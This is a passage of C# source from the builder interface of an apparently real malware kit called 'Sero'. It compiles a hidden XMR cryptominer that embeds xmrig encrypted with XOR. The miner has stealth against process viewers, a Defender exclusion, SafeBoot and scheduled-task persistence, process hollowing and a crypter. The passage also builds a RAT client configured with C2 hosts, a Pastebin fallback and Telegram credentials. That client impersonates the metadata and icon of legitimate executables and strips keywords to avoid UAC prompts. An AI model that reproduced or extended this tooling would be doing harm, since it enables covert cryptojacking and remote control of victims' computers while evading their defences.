    public static readonly byte[] TelegramChatId2Xor = {BuildXorBytes(BldTelegramChatId2.Text.Trim(), telegramXorKey)};
    public static readonly byte[] TelegramXorKey     = {telegramXorKeyLiteral};
}}
";
    }

    // ── XMR Miner builder ────────────────────────────────────────────────────

    private string GetMinerStubProjectDir()
    {
        var serverExeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
        var candidates = new[]
        {
            Path.Combine(serverExeDir, "..", "..", "..", "..", "..", "miner-stub"),
            Path.Combine(serverExeDir, "..", "..", "..", "..", "miner-stub"),
            Path.Combine(serverExeDir, "..", "miner-stub"),
        };
        foreach (var c in candidates)
        {
            var full = Path.GetFullPath(c);
            if (Directory.Exists(full)) return full;
        }
        return candidates[0];
    }

    private void AutoDetectXmrig()
    {
        var serverExeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
        var stubDir = GetStubProjectDir();
        var candidates = new[]
        {
            // SCM custom xmrig — supports --cinit-kill-targets (BotKiller)
            Path.Combine(serverExeDir, "..", "..", "..", "..", "..", "SilentCryptoMiner-main", "SilentCryptoMiner-main", "Resources", "Miners", "xmrig.exe"),
            Path.Combine(serverExeDir, "..", "..", "..", "..", "SilentCryptoMiner-main", "SilentCryptoMiner-main", "Resources", "Miners", "xmrig.exe"),
            Path.Combine(stubDir, "..", "SilentCryptoMiner-main", "SilentCryptoMiner-main", "Resources", "Miners", "xmrig.exe"),
            // Standard xmrig fallback
            Path.Combine(serverExeDir, "..", "..", "..", "..", "..", "xmrig-release", "xmrig.exe"),
            Path.Combine(serverExeDir, "..", "..", "..", "..", "xmrig-release", "xmrig.exe"),
            Path.Combine(stubDir, "..", "xmrig-release", "xmrig.exe"),
        };
        foreach (var raw in candidates)
        {
            var path = Path.GetFullPath(raw);
            if (!File.Exists(path)) continue;
            try
            {
                _bldXmrigBytes = File.ReadAllBytes(path);
                _bldXmrigPath  = path;
                BldMnrXmrigPath.Text       = $"xmrig.exe  ({_bldXmrigBytes.Length / 1024} KB)  — auto-detected";
                BldMnrXmrigPath.Foreground = new SolidColorBrush(Color.FromRgb(0x22, 0xC5, 0x5E));
                return;
            }
            catch { }
        }
        _bldXmrigBytes = null;
        _bldXmrigPath  = null;
        BldMnrXmrigPath.Text       = "xmrig.exe not found — place in xmrig-release/xmrig.exe";
        BldMnrXmrigPath.Foreground = new SolidColorBrush(Color.FromRgb(0xEF, 0x44, 0x44));
    }

    private string GenerateMinerConfigCs()
    {
        static string Esc(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
        int.TryParse(BldMnrCpuIdle.Text,       out int cpuIdle);       if (cpuIdle < 0 || cpuIdle > 100) cpuIdle = 75;
        int.TryParse(BldMnrCpuActive.Text,     out int cpuActive);
        int.TryParse(BldMnrIdleSec.Text,       out int idleSec);       if (idleSec < 5) idleSec = 30;
        string xorKeyB64 = _bldXorKey != null ? Convert.ToBase64String(_bldXorKey) : "";

        return $@"namespace MinerStub;

internal static class MinerConfig
{{
    public const string PoolUrl          = ""{Esc(BldMnrPool.Text.Trim())}"";
    public const bool   PoolTls          = {(BldMnrTls.IsChecked == true ? "true" : "false")};
    public const string Wallet           = ""{Esc(BldMnrWallet.Text.Trim())}"";
    public const string Password         = ""{Esc(BldMnrPass.Text.Trim())}"";
    public const string WorkerName       = ""{Esc(BldMnrWorkerName.Text.Trim())}"";
    public const string Algo             = ""{Esc(BldMnrAlgo.Text.Trim())}"";
    public const int    MaxCpuIdle       = {cpuIdle};
    public const int    MaxCpuActive     = {cpuActive};
    public const int    IdleThresholdSec = {idleSec};
    public const string InstallName      = ""{Esc(BldMnrInstallName.Text.Trim())}"";
    public const string StealthProcs     = ""{(BldMnrStealth.IsChecked == true ? "taskmgr.exe,procexp.exe,procexp64.exe,systeminformer.exe,processhacker.exe" : "")}"";
    public const bool   EnableStartup    = {(BldMnrStartup.IsChecked    == true ? "true" : "false")};
    public const bool   EnableSafeBoot   = {(BldMnrSafeBoot.IsChecked   == true ? "true" : "false")};
    public const bool   EnableWatchdog   = {(BldMnrWatchdog.IsChecked   == true ? "true" : "false")};
    public const bool   DisableSleep     = {(BldMnrDisableSleep.IsChecked == true ? "true" : "false")};
    public const bool   EnableHollowing  = {(BldMnrHollow.IsChecked      == true ? "true" : "false")};
    public const string HollowTarget     = ""{Esc(BldMnrHollowTarget.Text.Trim())}"";
    public const bool   EnableBotKiller          = {(BldMnrBotKiller.IsChecked == true ? "true" : "false")};
    public const bool   EnableDefenderExclusion  = true;
    public const string StatsUrl         = ""{Esc(BldMnrStatsUrl.Text.Trim())}"";
    public const string StatsToken       = ""{Esc(BldMnrStatsToken.Text.Trim())}"";
    public const string XorKey           = ""{xorKeyB64}"";
}}
";
    }

    private async void BldMnrBuild_Click(object sender, RoutedEventArgs e)
    {
        var minerDir = GetMinerStubProjectDir();
        if (!Directory.Exists(minerDir))
        {
            TxtMnrBuildStatus.Text = $"Error: miner-stub/ not found at {minerDir}";
            return;
        }
        if (_bldXmrigBytes == null || _bldXmrigBytes.Length == 0)
        {
            TxtMnrBuildStatus.Text = "Error: xmrig.exe not found. Place xmrig.exe in xmrig-release/.";
            return;
        }

        var dlg = new Microsoft.Win32.SaveFileDialog
        {
            Filter   = "Executable (*.exe)|*.exe",
            FileName = "miner.exe",
            Title    = "Save miner executable"
        };
        if (dlg.ShowDialog() != true) return;
        var outputExe = dlg.FileName;

        BtnMnrBuild.IsEnabled  = false;
        TxtMnrBuildStatus.Text = "Generating MinerConfig.cs…";

        try
        {
            // Generate random XOR key for this build, then write encrypted MinerConfig + xmrig.bin
            _bldXorKey = new byte[64];
            System.Security.Cryptography.RandomNumberGenerator.Fill(_bldXorKey);

            var cfgPath = Path.Combine(minerDir, "MinerConfig.cs");
            await File.WriteAllTextAsync(cfgPath, GenerateMinerConfigCs());

            // Deflate-compress then XOR-encrypt xmrig before embedding
            var xmrigBinDst = Path.Combine(minerDir, "xmrig.bin");
            if (_bldXmrigBytes != null && _bldXmrigBytes.Length > 0)
            {
                using var compMs = new System.IO.MemoryStream();
                using (var deflate = new System.IO.Compression.DeflateStream(compMs, System.IO.Compression.CompressionLevel.Optimal, leaveOpen: true))
                    deflate.Write(_bldXmrigBytes, 0, _bldXmrigBytes.Length);
                var compressed = compMs.ToArray();
                await File.WriteAllBytesAsync(xmrigBinDst, XorBytes(compressed, _bldXorKey));
            }

            TxtMnrBuildStatus.Text = "Compiling (NativeAOT)…";
            Log("[*] MinerBuilder: dotnet publish…");

            var tempOut    = Path.Combine(Path.GetTempPath(), "sero_miner_" + Guid.NewGuid().ToString("N")[..8]);
            var csprojPath = Path.Combine(minerDir, "MinerStub.csproj");
            var ilcThreads = Math.Min(Environment.ProcessorCount, 8);
            var publishArgs = $"publish \"{csprojPath}\" -c Release -r win-x64 -p:PublishAot=true -p:InvariantGlobalization=true -p:IlcOptimizationPreference=Size -p:IlcGenerateStackTraceData=false -p:IlcFoldIdenticalMethodBodies=true -p:IlcMaxParallelism={ilcThreads} -o \"{tempOut}\"";

            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName               = "dotnet",
                Arguments              = publishArgs,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true,
                WorkingDirectory       = minerDir,
            };
            var vsInstaller = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Microsoft Visual Studio", "Installer");
            if (Directory.Exists(vsInstaller))
                psi.Environment["PATH"] = vsInstaller + ";" + Environment.GetEnvironmentVariable("PATH");

            using var proc       = System.Diagnostics.Process.Start(psi)!;
            var stdoutTask       = proc.StandardOutput.ReadToEndAsync();
            var stderrTask       = proc.StandardError.ReadToEndAsync();
            await proc.WaitForExitAsync();
            var stdout = await stdoutTask;
            var stderr = await stderrTask;

            if (proc.ExitCode != 0)
            {
                Log($"[!] MinerBuilder: Build failed (exit {proc.ExitCode})");
                if (!string.IsNullOrWhiteSpace(stderr)) Log(stderr);
                TxtMnrBuildStatus.Text = "Build FAILED. Check logs.";
                return;
            }

            var builtExe = Directory.GetFiles(tempOut, "*.exe").FirstOrDefault();
            if (builtExe == null) { TxtMnrBuildStatus.Text = "Build output not found."; return; }

            File.Copy(builtExe, outputExe, true);
            try { Directory.Delete(tempOut, true); } catch { }
            // Clean up the temporary xmrig.bin resource file from the project dir
            try { File.Delete(xmrigBinDst); } catch { }

            if (BldMnrEncrypt.IsChecked == true)
            {
                TxtMnrBuildStatus.Text = "Applying crypter…";
                Log("[*] MinerBuilder: applying C++ crypter…");
                try { await SeroServer.Builder.CrypterBuilder.ApplyAsync(outputExe, Log, iconPath: null, metadata: null, uacBypass: false); Log("[+] MinerBuilder: crypter applied."); }
                catch (Exception cex) { Log($"[!] MinerBuilder: crypter skipped — {cex.Message}"); }
            }

            // Generate PS1 uninstaller script
            var uninstallerPs1 = Path.Combine(
                Path.GetDirectoryName(outputExe)!,
                Path.GetFileNameWithoutExtension(outputExe) + "_uninstall.ps1");
            await File.WriteAllTextAsync(uninstallerPs1, GenerateUninstallerScript());
            Log($"[+] MinerBuilder: PS1 uninstaller → {Path.GetFileName(uninstallerPs1)}");

            // Build silent uninstaller .exe from miner-uninstaller project
            TxtMnrBuildStatus.Text = "Building uninstaller.exe…";
            var uninstallerExePath = Path.Combine(
                Path.GetDirectoryName(outputExe)!,
                Path.GetFileNameWithoutExtension(outputExe) + "_uninstall.exe");
            await BuildUninstallerExeAsync(uninstallerExePath);

            var size = new FileInfo(outputExe).Length;
            Log($"[+] MinerBuilder: {Path.GetFileName(outputExe)} ({size:N0} bytes) saved.");
            TxtMnrBuildStatus.Text = $"Built: {Path.GetFileName(outputExe)} ({size / 1024} KB)";
            MessageBox.Show($"Miner built!\n\nFile: {Path.GetFileName(outputExe)}\nSize: {size / 1024} KB\nUninstaller: {Path.GetFileName(uninstallerExePath)}",
                "Sero — Miner Built", MessageBoxButton.OK, MessageBoxImage.Information);
        }
        catch (Exception ex)
        {
            Log($"[!] MinerBuilder: {ex.Message}");
            TxtMnrBuildStatus.Text = $"Error: {ex.Message}";
        }
        finally { BtnMnrBuild.IsEnabled = true; }
    }

    private string GetMinerUninstallerProjectDir()
    {
        var serverExeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
        var candidates = new[]
        {
            Path.Combine(serverExeDir, "..", "..", "..", "..", "..", "miner-uninstaller"),
            Path.Combine(serverExeDir, "..", "..", "..", "..", "miner-uninstaller"),
            Path.Combine(serverExeDir, "..", "miner-uninstaller"),
        };
        foreach (var c in candidates)
        {
            var full = Path.GetFullPath(c);
            if (Directory.Exists(full)) return full;
        }
        return candidates[0];
    }

    private async Task BuildUninstallerExeAsync(string outputExePath)
    {
        try
        {
            var uninstDir = GetMinerUninstallerProjectDir();
            if (!Directory.Exists(uninstDir)) { Log("[!] miner-uninstaller/ not found — skipping exe uninstaller."); return; }

            // Write UninstallerConfig.cs with baked-in install name, hollow target and watchdog flag
            var installName    = BldMnrInstallName.Text.Trim();
            var hollowTarget   = (BldMnrHollow.IsChecked == true) ? GetHollowTarget() : "";
            var enableWatchdog = BldMnrWatchdog.IsChecked == true;
            var cfgContent = $@"namespace MinerUninstaller;
internal static class UninstallerConfig
{{
    public const string InstallName    = ""{installName.Replace("\"", "\\\"")}"";
    public const string HollowTarget   = ""{hollowTarget.Replace("\"", "\\\"")}"";
    public const bool   EnableWatchdog = {(enableWatchdog ? "true" : "false")};
}}
";
            await File.WriteAllTextAsync(Path.Combine(uninstDir, "UninstallerConfig.cs"), cfgContent);

            var tempOut = Path.Combine(Path.GetTempPath(), "sero_uninst_" + Guid.NewGuid().ToString("N")[..8]);
            var psi = new System.Diagnostics.ProcessStartInfo("dotnet",
                $"publish \"{Path.Combine(uninstDir, "MinerUninstaller.csproj")}\" -c Release -r win-x64 --sc true -o \"{tempOut}\" --nologo")
            {
                CreateNoWindow  = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
            };
            using var proc = System.Diagnostics.Process.Start(psi)!;
            await proc.WaitForExitAsync();

            var builtExe = Directory.GetFiles(tempOut, "*.exe").FirstOrDefault();
            if (builtExe != null)
            {
                File.Copy(builtExe, outputExePath, true);
                Log($"[+] MinerBuilder: uninstaller.exe → {Path.GetFileName(outputExePath)} ({new FileInfo(outputExePath).Length / 1024} KB)");
            }
            else
            {
                Log($"[!] MinerBuilder: uninstaller.exe build failed (exit {proc.ExitCode}).");
            }
            try { Directory.Delete(tempOut, true); } catch { }
        }
        catch (Exception ex) { Log($"[!] MinerBuilder: uninstaller.exe error — {ex.Message}"); }
    }

    private string GenerateUninstallerScript()
    {
        static string Esc(string s) => s.Replace("'", "''");
        var installName = BldMnrInstallName.Text.Trim();
        var folderName  = installName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)
                          ? installName[..^4] : installName;
        var taskMain    = $@"\Microsoft\Windows\{folderName}";
        var taskWd      = $@"\Microsoft\Windows\{folderName}Wd";

        return $@"# Miner uninstaller — run as admin
# Auto-elevate
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{
    Start-Process powershell -ArgumentList ""-ExecutionPolicy Bypass -File `""$PSCommandPath`"""" -Verb RunAs; exit
}}

$installName = '{Esc(installName)}'
$folderName  = '{Esc(folderName)}'
$installDir  = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft', 'Windows', $folderName)
$taskMain    = '{Esc(taskMain)}'
$taskWd      = '{Esc(taskWd)}'

Write-Host '=== Miner Uninstaller ===' -ForegroundColor Cyan

# 1. Delete scheduled tasks (stop auto-restart)
schtasks /delete /tn $taskMain /f 2>&1 | Out-Null
schtasks /delete /tn $taskWd  /f 2>&1 | Out-Null
Write-Host '[OK] Scheduled tasks removed'

# 2. Enable SeDebugPrivilege to bypass protected-process DACL
Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public class MK {{
    [DllImport(""ntdll.dll"")] public static extern int RtlAdjustPrivilege(int p,bool e,bool t,out bool v);
    [DllImport(""kernel32.dll"",SetLastError=true)] public static extern IntPtr OpenProcess(uint a,bool i,int p);
    [DllImport(""kernel32.dll"")] public static extern bool TerminateProcess(IntPtr h,uint c);
    [DllImport(""kernel32.dll"")] public static extern bool CloseHandle(IntPtr h);
    [DllImport(""ntdll.dll"")] public static extern int NtSetInformationProcess(IntPtr h,int c,ref uint v,int s);
}}
'@ -ErrorAction SilentlyContinue
$vv=$false; [MK]::RtlAdjustPrivilege(20,$true,$false,[ref]$vv) | Out-Null
Write-Host '[OK] SeDebugPrivilege enabled'

# 3. Kill miner processes (removes critical flag first to avoid BSOD)
$procs = Get-Process -Name $folderName -ErrorAction SilentlyContinue | Sort-Object {{ $_.Threads.Count }} -Descending
foreach ($p in $procs) {{
    $h = [MK]::OpenProcess(0x1FFFFF,$false,$p.Id)
    if ($h -ne [IntPtr]::Zero) {{
        $z=[uint32]0; [MK]::NtSetInformationProcess($h,0x1D,[ref]$z,4) | Out-Null
        $ok=[MK]::TerminateProcess($h,0); [MK]::CloseHandle($h) | Out-Null
        if ($ok) {{ Write-Host ""[OK] Killed PID $($p.Id) ($($p.Threads.Count) threads)"" }}
    }}
}}

# 4. Delete install directory
Start-Sleep -Milliseconds 500
if (Test-Path $installDir) {{
    Remove-Item $installDir -Recurse -Force -ErrorAction SilentlyContinue
    Start-Sleep 1
    Remove-Item $installDir -Recurse -Force -ErrorAction SilentlyContinue
    if (-not (Test-Path $installDir)) {{ Write-Host '[OK] Install directory removed' }}
    else {{ Write-Host '[!] Could not fully remove install directory' }}
}}

# 5. SafeBoot registry cleanup
foreach ($mode in @('Network','Minimal')) {{
    $key = ""HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\$mode\$folderName""
    if (Test-Path $key) {{ Remove-Item $key -Force; Write-Host ""[OK] Removed SafeBoot key ($mode)"" }}
}}

# 6. Service cleanup
$svc = Get-Service $folderName -ErrorAction SilentlyContinue
if ($svc) {{
    sc.exe stop   $folderName 2>&1 | Out-Null
    sc.exe delete $folderName 2>&1 | Out-Null
    Write-Host '[OK] Service removed'
}}

Write-Host ''
Write-Host '[DONE] Miner fully removed. Safe to reboot.' -ForegroundColor Green
Read-Host 'Press Enter to close'
";
    }


    private void BldMnrSaveConfig_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.SaveFileDialog
        {
            Filter   = "JSON (*.json)|*.json",
            FileName = "miner_config.json",
            Title    = "Save miner config"
        };
        if (dlg.ShowDialog() != true) return;
        try
        {
            var obj = new System.Text.Json.Nodes.JsonObject
            {
                ["Pool"]         = BldMnrPool.Text,
                ["Wallet"]       = BldMnrWallet.Text,
                ["Password"]     = BldMnrPass.Text,
                ["WorkerName"]   = BldMnrWorkerName.Text,
                ["Algo"]         = BldMnrAlgo.Text,
                ["CpuIdle"]      = BldMnrCpuIdle.Text,
                ["CpuActive"]    = BldMnrCpuActive.Text,
                ["IdleSec"]      = BldMnrIdleSec.Text,
                ["InstallName"]  = BldMnrInstallName.Text,
                ["StealthProcs"] = BldMnrStealth.IsChecked == true ? "1" : "0",
                ["StatsToken"]   = BldMnrStatsToken.Text,
                ["DisableSleep"]  = BldMnrDisableSleep.IsChecked == true,
                ["Startup"]      = BldMnrStartup.IsChecked   == true,
                ["SafeBoot"]        = BldMnrSafeBoot.IsChecked    == true,
                ["Watchdog"]        = BldMnrWatchdog.IsChecked   == true,
                ["AntiKill"]        = BldMnrWatchdog.IsChecked   == true,
                ["BotKiller"]       = BldMnrBotKiller.IsChecked  == true,
                ["Hollow"]          = BldMnrHollow.IsChecked     == true,
                ["HollowTarget"] = BldMnrHollowTarget.Text,
                ["Encrypt"]      = BldMnrEncrypt.IsChecked  == true,
            };
            File.WriteAllText(dlg.FileName, obj.ToJsonString(new System.Text.Json.JsonSerializerOptions { WriteIndented = true }));
            TxtMnrBuildStatus.Text = $"Config saved: {Path.GetFileName(dlg.FileName)}";
        }
        catch (Exception ex) { TxtMnrBuildStatus.Text = $"Save error: {ex.Message}"; }
    }

    private void BldMnrLoadConfig_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "JSON (*.json)|*.json",
            Title  = "Load miner config"
        };
        if (dlg.ShowDialog() != true) return;
        try
        {
            var json = File.ReadAllText(dlg.FileName);
            var obj  = System.Text.Json.Nodes.JsonNode.Parse(json)!.AsObject();
            string? Get(string k) => obj.TryGetPropertyValue(k, out var v) ? v?.GetValue<string>() : null;
            bool?   GetB(string k) => obj.TryGetPropertyValue(k, out var v) ? v?.GetValue<bool>() : null;

            if (Get("Pool")         is string pool)  BldMnrPool.Text         = pool;
            if (Get("Wallet")       is string w)     BldMnrWallet.Text        = w;
            if (Get("Password")     is string p)     BldMnrPass.Text          = p;
            if (Get("WorkerName")   is string wn)    BldMnrWorkerName.Text    = wn;
            if (Get("Algo")         is string algo)  BldMnrAlgo.Text          = algo;
            if (Get("CpuIdle")      is string ci)    BldMnrCpuIdle.Text       = ci;
            if (Get("CpuActive")    is string ca)    BldMnrCpuActive.Text     = ca;
            if (Get("IdleSec")      is string id)    BldMnrIdleSec.Text       = id;
            if (Get("InstallName")  is string ins)   BldMnrInstallName.Text   = ins;
            if (Get("StealthProcs") is string sp)    BldMnrStealth.IsChecked  = sp == "1" || (sp != "0" && sp.Length > 0);
            if (Get("StatsToken")   is string tok)   BldMnrStatsToken.Text    = tok;
            if (Get("HollowTarget") is string ht)    BldMnrHollowTarget.Text  = ht;
            if (GetB("DisableSleep") is bool ds)  BldMnrDisableSleep.IsChecked = ds;
            if (GetB("Startup")     is bool st)  BldMnrStartup.IsChecked   = st;
            if (GetB("SafeBoot")    is bool sb)  BldMnrSafeBoot.IsChecked  = sb;
            if (GetB("Watchdog")    is bool wd)  BldMnrWatchdog.IsChecked  = wd;
            if (GetB("AntiKill")    is bool ak && ak)  BldMnrWatchdog.IsChecked = true;
            if (GetB("BotKiller")   is bool bk)  BldMnrBotKiller.IsChecked = bk;
            if (GetB("Hollow")      is bool ho)  BldMnrHollow.IsChecked   = ho;
            if (GetB("Encrypt")     is bool en)  BldMnrEncrypt.IsChecked  = en;
            TxtMnrBuildStatus.Text = $"Config loaded: {Path.GetFileName(dlg.FileName)}";
        }
        catch (Exception ex) { TxtMnrBuildStatus.Text = $"Load error: {ex.Message}"; }
    }

    private void BtnPageRat_Click(object sender, RoutedEventArgs e)
    {
        PageRat.Visibility = Visibility.Visible;
        PageXmr.Visibility = Visibility.Collapsed;
        BtnPageRat.Opacity = 1.0;
        BtnPageXmr.Opacity = 0.55;
    }

    private void BtnPageXmr_Click(object sender, RoutedEventArgs e)
    {
        PageRat.Visibility = Visibility.Collapsed;
        PageXmr.Visibility = Visibility.Visible;
        BtnPageRat.Opacity = 0.55;
        BtnPageXmr.Opacity = 1.0;
        AutoDetectXmrig();
    }

    private string GetPrimaryHost()
    {
        // Get first host from ListBox, or first from comma-separated, or default
        if (BldHosts.Items.Count > 0)
            return (BldHosts.Items[0] as string) ?? "127.0.0.1";
        return "127.0.0.1";
    }

    private void BldAddHost_Click(object sender, RoutedEventArgs e)
    {
        var hostInput = BldHostInput.Text.Trim();
        if (!string.IsNullOrEmpty(hostInput) && !BldHosts.Items.Contains(hostInput))
        {
            BldHosts.Items.Add(hostInput);
            BldHostInput.Clear();
        }
    }

    private void BldDelHost_Click(object sender, RoutedEventArgs e)
    {
        if (BldHosts.SelectedIndex >= 0)
            BldHosts.Items.RemoveAt(BldHosts.SelectedIndex);
    }


    private void BldUsePastebin_Checked(object sender, RoutedEventArgs e)
    {
        BldHosts.IsEnabled = false;
        BldHostInput.IsEnabled = false;
        BldPort.IsEnabled = false;
        BldPastebinUrl.IsEnabled = true;
    }

    private void BldUsePastebin_Unchecked(object sender, RoutedEventArgs e)
    {
        BldHosts.IsEnabled = true;
        BldHostInput.IsEnabled = true;
        BldPort.IsEnabled = true;
        BldPastebinUrl.IsEnabled = false;
    }


    private void ApplyIcon(string exePath, string iconPath)
    {
        try
        {
            // Try multiple locations for rcedit.exe
            var candidates = new[]
            {
                Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "..", "rcedit.exe")), // repo root (bin/Release/net10.0-windows/ → 4 levels up)
                Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "rcedit.exe")), // fallback 3 levels
                "rcedit.exe", // PATH
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "..", "..", "Downloads", "sero", "ancien code", "code qui marchai", "rcedit.exe"),
            };

            string? rceditPath = null;
            foreach (var candidate in candidates)
            {
                if (File.Exists(candidate))
                {
                    rceditPath = candidate;
                    break;
                }
            }

            if (rceditPath == null)
            {
                Log($"[!] Builder: rcedit.exe not found. Icon not applied.");
                return;
            }

            Log($"[*] Builder: Using rcedit at {rceditPath}");

            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = rceditPath,
                Arguments = $"\"{exePath}\" --set-icon \"{iconPath}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            using var process = System.Diagnostics.Process.Start(psi);
            if (process != null)
            {
                process.WaitForExit();
                if (process.ExitCode == 0)
                {
                    Log($"[+] Builder: Icon applied successfully");
                }
                else
                {
                    Log($"[!] Builder: rcedit failed (exit code {process.ExitCode})");
                }
            }
        }
        catch (Exception ex)
        {
            Log($"[!] Builder: Icon application error: {ex.Message}");
        }
    }

    private void BldSetAssembly_Checked(object sender, RoutedEventArgs e)
    {
        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Executable files (*.exe)|*.exe",
            Title = "Select executable file"
        };
        if (dialog.ShowDialog() == true)
        {
            // Store the full path in Tag for use in Build_Click
            BldAssemblyPath.Tag = dialog.FileName;
            // Display only the filename
            BldAssemblyPath.Text = Path.GetFileName(dialog.FileName);
        }
        else
        {
            BldSetAssembly.IsChecked = false;
        }
    }

    private void BldSetAssembly_Unchecked(object sender, RoutedEventArgs e)
    {
        BldAssemblyPath.Text = "No executable selected";
        BldAssemblyPath.Tag = null;
    }

    private void BldSetIcon_Checked(object sender, RoutedEventArgs e)
    {
        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Icon files (*.ico)|*.ico",
            Title = "Select icon file"
        };
        if (dialog.ShowDialog() == true)
        {
            BldIconPath.Text = dialog.FileName;
        }
        else
        {
            // User cancelled, uncheck the checkbox
            BldSetIcon.IsChecked = false;
        }
    }

    private void BldSetIcon_Unchecked(object sender, RoutedEventArgs e)
    {
        BldIconPath.Text = "No icon selected";
    }

    private async void Build_Click(object sender, RoutedEventArgs e)
    {
        var stubDir = GetStubProjectDir();
        if (!Directory.Exists(stubDir))
        {
            Log("[!] Builder: stub/ project not found.");
            TxtBuildStatus.Text = $"Error: {stubDir} not found";
            return;
        }

        // Determine assembly name from selected executable
        string assemblyName = "SeroStub";
        string? selectedExePath = null;

        if (BldSetAssembly.IsChecked == true && BldAssemblyPath.Tag != null)
        {
            selectedExePath = BldAssemblyPath.Tag.ToString()!;
            if (selectedExePath != null && File.Exists(selectedExePath))
            {
                assemblyName = Path.GetFileNameWithoutExtension(selectedExePath);
            }
        }

        var dialogBuild = new Microsoft.Win32.SaveFileDialog
        {
            Filter = "Executable (*.exe)|*.exe",
            FileName = string.Empty,
            Title = "Save built client"
        };
        if (dialogBuild.ShowDialog() != true) return;

        var outputExe = dialogBuild.FileName;

        BtnBuild.IsEnabled = false;
        BuilderPanel.IsEnabled = false;
        TxtBuildStatus.Text = "Generating config...";
        Log("[*] Builder: Starting build...");

        try
        {
            var configPath = Path.Combine(stubDir, "Config.cs");
            await File.WriteAllTextAsync(configPath, GenerateConfigCs());
            Log("[+] Builder: Config.cs generated.");

            var csprojPath = Path.Combine(stubDir, "SeroStub.csproj");
            var csproj = await File.ReadAllTextAsync(csprojPath);

            // Extract metadata from selected executable if checkbox is checked
            var assemblyTitle = assemblyName;
            var company = string.Empty;
            var product = string.Empty;
            var fileVersion = "1.0.0.0";
            var productVersion = "1.0.0.0";
            var copyright = string.Empty;

            if (BldSetAssembly.IsChecked == true && selectedExePath != null && File.Exists(selectedExePath))
            {
                try
                {
                    var versionInfo = System.Diagnostics.FileVersionInfo.GetVersionInfo(selectedExePath);

                    if (!string.IsNullOrWhiteSpace(versionInfo.ProductName))
                        product = versionInfo.ProductName.Trim();
                    if (!string.IsNullOrWhiteSpace(versionInfo.CompanyName))
                        company = versionInfo.CompanyName.Trim();
                    if (!string.IsNullOrWhiteSpace(versionInfo.FileVersion))
                    {
                        fileVersion = versionInfo.FileVersion.Trim();
                        // Clean version - keep only numeric version (e.g., "0.18.4.5" from "0.18.4.5-b1a6201...")
                        var parts = fileVersion.Split(new[] { '-', '+', ' ' }, System.StringSplitOptions.None);
                        if (parts.Length > 0 && !string.IsNullOrEmpty(parts[0]))
                            fileVersion = parts[0];
                    }

                    // Use FileVersion for ProductVersion to avoid random characters
                    productVersion = fileVersion; // Force use of cleaned FileVersion

                    if (!string.IsNullOrWhiteSpace(versionInfo.FileDescription))
                        assemblyTitle = versionInfo.FileDescription.Trim();

                    // Extract copyright - try multiple sources
                    if (!string.IsNullOrWhiteSpace(versionInfo.LegalCopyright))
                        copyright = versionInfo.LegalCopyright.Trim();

                    Log($"[+] Builder: Extracted metadata from {Path.GetFileName(selectedExePath)}");
                    Log($"[+] Builder: Company={company}, Product={product}, FileVersion={fileVersion}, ProductVersion={productVersion}, Copyright='{copyright}'");
                }
                catch (Exception ex)
                {
                    Log($"[!] Builder: Could not extract metadata: {ex.Message}");
                }
            }

            if (string.IsNullOrEmpty(assemblyTitle)) assemblyTitle = "";
            if (string.IsNullOrEmpty(company)) company = "";
            if (string.IsNullOrEmpty(product)) product = "";
            if (string.IsNullOrEmpty(fileVersion)) fileVersion = "1.0.0.0";
            if (string.IsNullOrEmpty(productVersion)) productVersion = fileVersion;

            // Windows "Installer Detection" heuristic scans PE metadata for these
            // keywords and forces a UAC elevation popup even without a manifest.
            // Strip them from any copied field to prevent the popup on the client.
            static string StripInstallerKeywords(string s)
            {
                if (string.IsNullOrEmpty(s)) return s;
                var triggers = new[] { "setup", "install", "update", "patch",
                                       "upgrade", "deploy", "wizard", "launcher",
                                       "bootstrap", "uninstall", "repair" };
                foreach (var t in triggers)
                    s = System.Text.RegularExpressions.Regex.Replace(
                            s, t, "", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                return s.Trim();
            }
            assemblyTitle  = StripInstallerKeywords(assemblyTitle);
            product        = StripInstallerKeywords(product);
            assemblyName   = StripInstallerKeywords(assemblyName);

            // Escape XML special characters
            var escapeXml = (string s) => System.Security.SecurityElement.Escape(s) ?? s;
            assemblyName = escapeXml(assemblyName);
            assemblyTitle = escapeXml(assemblyTitle);
            company = escapeXml(company);
            product = escapeXml(product);
            fileVersion = escapeXml(fileVersion);
            productVersion = escapeXml(productVersion);
            copyright = escapeXml(copyright);

            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<AssemblyName>[^<]*</AssemblyName>", $"<AssemblyName>{assemblyName}</AssemblyName>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<AssemblyTitle>[^<]*</AssemblyTitle>", $"<AssemblyTitle>{assemblyTitle}</AssemblyTitle>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<Description>[^<]*</Description>", $"<Description>{assemblyTitle}</Description>");
